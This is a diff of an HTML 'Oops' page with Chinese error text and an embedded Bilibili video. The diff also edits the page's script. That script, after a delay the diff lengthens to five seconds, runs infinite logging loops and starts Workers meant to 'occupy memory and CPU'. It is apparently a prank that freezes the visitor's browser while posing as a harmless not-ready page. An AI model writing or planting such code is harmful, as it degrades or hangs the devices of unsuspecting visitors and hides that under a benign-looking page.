@@ -32,10 +32,9 @@
 <body>
     <div class="container">
         <iframe src="//player.bilibili.com/player.html?isOutside=true&aid=80433022&bvid=BV1GJ411x7h7&cid=137649199&p=1" scrolling="no" border="0" frameborder="no" framespacing="0" allowfullscreen="true"></iframe>
-        <h1>OOOOps...</h1>
-        <h3>你请求的内容还没有准备好</h3>
-        <h3>不过我们为你准备了这个神秘网页</h3>
-        <p>那就让我们一起来听会音乐，看会视频放松一下吧</p>
+        <h1>Oops...</h1>
+        <h3>你请求的内容还没准备好</h3>
+        <h3>不过你还是看到了这个神秘网页</h3>
     </div>
     <script>
         function sleep(ms) {
@@ -44,7 +43,7 @@
 
         async function run() {
             console.log("开始等待...");
-            await sleep(5); // 等待5毫秒
+            await sleep(5000); // 等待5000毫秒
             for (let i = 114.514191981; i > 0; i++) {
                 while (true) {
                     console.log(i += 114.514191981)
@@ -66,7 +65,7 @@
         }
         async function sun() {
             console.log("开始等待...");
-            await sleep(5); // 等待5毫秒
+            await sleep(5000); // 等待5000毫秒
             console.log("开始占用内存和CPU...");
 
             // 创建内存占用的Worker
